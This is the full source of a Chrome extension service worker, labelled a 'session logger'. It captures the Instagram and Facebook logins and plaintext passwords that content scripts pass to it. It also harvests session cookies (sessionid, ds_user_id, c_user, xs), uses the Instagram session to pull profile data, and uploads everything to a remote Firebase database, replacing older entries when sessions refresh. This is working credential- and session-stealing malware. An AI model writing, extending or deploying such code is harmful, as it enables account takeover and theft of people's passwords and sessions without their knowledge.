console.log(
  "%c╔══════════════════════════════════════════════════════════════╗",
  "color: #2196f3; font-weight: bold;"
);
console.log(
  "%c║            SESSION LOGGER SERVICE WORKER LOADED              ║",
  "color: #2196f3; font-weight: bold;"
);
console.log(
  "%c╚══════════════════════════════════════════════════════════════╝",
  "color: #2196f3; font-weight: bold;"
);

import { db } from "./firebase-init.js";
import {
  collection,
  addDoc,
  getDocs,
  query,
  where,
  deleteDoc,
  doc,
} from "./firebase-firestore.js";

const savedInstagramBySessionId = new Set();
const savedFacebookByXs = new Set();

let pendingInstagramCreds = null;
let pendingFacebookCreds = null;

function isValidString(value, minLength = 1) {
  return (
    value !== null &&
    value !== undefined &&
    typeof value === "string" &&
    value.trim().length >= minLength
  );
}

function isValidEmail(email) {
  return isValidString(email, 3) && (email.includes("@") || email.length >= 3);
}

function logHeader(title, color = "#2196f3") {
  console.log(
    `%c╔══════════════════════════════════════════════════════════════╗`,
    `color: ${color}; font-weight: bold;`
  );
  console.log(
    `%c║  ${title.padEnd(60)}║`,
    `color: ${color}; font-weight: bold;`
  );
  console.log(
    `%c╚══════════════════════════════════════════════════════════════╝`,
    `color: ${color}; font-weight: bold;`
  );
}

chrome.webNavigation.onCompleted.addListener(
  async ({ url, frameId }) => {
    if (frameId !== 0) return;

    if (url.includes("instagram.com")) {
      await handleInstagramSession();
    } else if (url.includes("facebook.com")) {
      await handleFacebookSession();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

if (!globalThis.messageListenerAttached) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === "instagram_login_data") {
      handleInstagramLoginData(msg.data);
    }

    if (msg.type === "facebook_login_data") {
      handleFacebookLoginData(msg.data);
    }

    return true;
  });

  globalThis.messageListenerAttached = true;
}

function handleInstagramLoginData(data) {
  const { username, password } = data;

  if (!isValidString(username, 3) || !isValidString(password, 6)) {
    console.log(
      "%c[IG] VALIDATION FAILED: Username must be >=3 chars, password >=6 chars",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("INSTAGRAM LOGIN CAPTURED", "#e91e63");

  pendingInstagramCreds = {
    username: username.trim(),
    password,
    capturedAt: new Date().toISOString(),
  };

  console.log(
    "%c[IG] PENDING: Credentials stored, waiting for session cookies...",
    "color: #ff9800; font-weight: bold;"
  );
  console.table({ username: username.trim(), password: "***hidden***" });
}

function handleFacebookLoginData(data) {
  const { email, password } = data;

  if (!isValidEmail(email) || !isValidString(password, 6)) {
    console.log(
      "%c[FB] VALIDATION FAILED: Email must be >=3 chars, password >=6 chars",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("FACEBOOK LOGIN CAPTURED", "#1877f2");

  pendingFacebookCreds = {
    email: email.trim(),
    password,
    capturedAt: new Date().toISOString(),
  };

  console.log(
    "%c[FB] PENDING: Credentials stored, waiting for session cookies...",
    "color: #ff9800; font-weight: bold;"
  );
  console.table({ email: email.trim(), password: "***hidden***" });
}

async function handleInstagramSession() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    logHeader("INSTAGRAM SESSION CHECK", "#e91e63");

    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.log(
        "%c[IG] Missing required cookies:",
        "color: #ff9800; font-weight: bold;"
      );
      if (!session) console.log("%c   - sessionid NOT found", "color: #ff9800;");
      if (!dsUserId) console.log("%c   - ds_user_id NOT found", "color: #ff9800;");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    if (savedInstagramBySessionId.has(sessionId)) {
      console.log(
        "%c[IG] SKIP: Session already processed in this browser session",
        "color: #9e9e9e;"
      );
      return;
    }

    console.log("%c[IG] Cookies found:", "color: #4caf50; font-weight: bold;");
    console.table([
      { name: "sessionid", value: sessionId.substring(0, 20) + "..." },
      { name: "ds_user_id", value: userId },
    ]);

    let username = "unknown_user";
    let bio = "";

    try {
      console.log(
        "%c[IG] Fetching user info from Instagram API...",
        "color: #2196f3; font-weight: bold;"
      );

      const response = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (response.ok) {
        const data = await response.json();
        const user = data.user || {};
        username = user.username || "unknown_user";
        bio = user.biography || "";

        console.log(
          "%c[IG] User info fetched:",
          "color: #4caf50; font-weight: bold;"
        );
        console.table({ username, bio: bio.substring(0, 50) + (bio.length > 50 ? "..." : "") });
      } else {
        console.log(
          `%c[IG] API response: HTTP ${response.status}`,
          "color: #ff9800;"
        );
      }
    } catch (error) {
      console.log(
        "%c[IG] API fetch error:",
        "color: #f44336; font-weight: bold;",
        error.message
      );
    }

    const docData = {
      sessionId,
      userId,
      username,
      bio,
      timestamp: new Date(),
    };

    if (pendingInstagramCreds) {
      docData.loginUsername = pendingInstagramCreds.username;
      docData.loginPassword = pendingInstagramCreds.password;
      docData.credentialsCapturedAt = pendingInstagramCreds.capturedAt;

      console.log(
        "%c[IG] COMBINED: Merging pending credentials with session",
        "color: #8bc34a; font-weight: bold;"
      );

      pendingInstagramCreds = null;
    }

    const colRef = collection(db, "instagram");

    try {
      const sessionQuery = query(colRef, where("sessionId", "==", sessionId));
      const sessionSnapshot = await getDocs(sessionQuery);

      if (!sessionSnapshot.empty) {
        console.log(
          "%c[IG] SKIP: Exact sessionId already exists in database",
          "color: #9e9e9e;"
        );
        savedInstagramBySessionId.add(sessionId);
        return;
      }

      const userQuery = query(colRef, where("userId", "==", userId));
      const userSnapshot = await getDocs(userQuery);

      if (!userSnapshot.empty) {
        console.log(
          "%c[IG] SESSION REFRESH DETECTED: Deleting old session(s)...",
          "color: #ff9800; font-weight: bold;"
        );

        for (const oldDoc of userSnapshot.docs) {
          const oldData = oldDoc.data();
          console.log(
            `%c[IG] Deleting old session: ${oldData.sessionId?.substring(0, 15)}...`,
            "color: #ff9800;"
          );
          await deleteDoc(doc(db, "instagram", oldDoc.id));
        }
      }

      await addDoc(colRef, docData);
      savedInstagramBySessionId.add(sessionId);

      console.log(
        `%c[IG] SAVED: Session for @${username} (userId: ${userId})`,
        "color: #4caf50; font-weight: bold; font-size: 14px;"
      );
      console.table({
        sessionId: sessionId.substring(0, 20) + "...",
        userId,
        username,
        hasCredentials: !!docData.loginUsername,
      });
    } catch (err) {
      console.log(
        "%c[IG] ERROR: Failed to save session",
        "color: #f44336; font-weight: bold;"
      );
      console.error(err);
    }
  });
}

async function handleFacebookSession() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    logHeader("FACEBOOK SESSION CHECK", "#1877f2");

    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.log(
        "%c[FB] Missing required cookies:",
        "color: #ff9800; font-weight: bold;"
      );
      if (!cUser) console.log("%c   - c_user NOT found", "color: #ff9800;");
      if (!xs) console.log("%c   - xs NOT found", "color: #ff9800;");
      return;
    }

    const cUserValue = cUser.value;
    const xsValue = xs.value;

    if (savedFacebookByXs.has(xsValue)) {
      console.log(
        "%c[FB] SKIP: Session already processed in this browser session",
        "color: #9e9e9e;"
      );
      return;
    }

    console.log("%c[FB] Cookies found:", "color: #4caf50; font-weight: bold;");
    console.table([
      { name: "c_user", value: cUserValue },
      { name: "xs", value: xsValue.substring(0, 20) + "..." },
    ]);

    const docData = {
      c_user: cUserValue,
      xs: xsValue,
      timestamp: new Date(),
    };

    if (pendingFacebookCreds) {
      docData.loginEmail = pendingFacebookCreds.email;
      docData.loginPassword = pendingFacebookCreds.password;
      docData.credentialsCapturedAt = pendingFacebookCreds.capturedAt;

      console.log(
        "%c[FB] COMBINED: Merging pending credentials with session",
        "color: #8bc34a; font-weight: bold;"
      );

      pendingFacebookCreds = null;
    }

    const colRef = collection(db, "facebook");

    try {
      const xsQuery = query(colRef, where("xs", "==", xsValue));
      const xsSnapshot = await getDocs(xsQuery);

      if (!xsSnapshot.empty) {
        console.log(
          "%c[FB] SKIP: Exact xs cookie already exists in database",
          "color: #9e9e9e;"
        );
        savedFacebookByXs.add(xsValue);
        return;
      }

      const userQuery = query(colRef, where("c_user", "==", cUserValue));
      const userSnapshot = await getDocs(userQuery);

      if (!userSnapshot.empty) {
        console.log(
          "%c[FB] SESSION REFRESH DETECTED: Deleting old session(s)...",
          "color: #ff9800; font-weight: bold;"
        );

        for (const oldDoc of userSnapshot.docs) {
          const oldData = oldDoc.data();
          console.log(
            `%c[FB] Deleting old session for c_user: ${oldData.c_user}`,
            "color: #ff9800;"
          );
          await deleteDoc(doc(db, "facebook", oldDoc.id));
        }
      }

      await addDoc(colRef, docData);
      savedFacebookByXs.add(xsValue);

      console.log(
        `%c[FB] SAVED: Session for c_user: ${cUserValue}`,
        "color: #4caf50; font-weight: bold; font-size: 14px;"
      );
      console.table({
        c_user: cUserValue,
        xs: xsValue.substring(0, 20) + "...",
        hasCredentials: !!docData.loginEmail,
      });
    } catch (err) {
      console.log(
        "%c[FB] ERROR: Failed to save session",
        "color: #f44336; font-weight: bold;"
      );
      console.error(err);
    }
  });
}
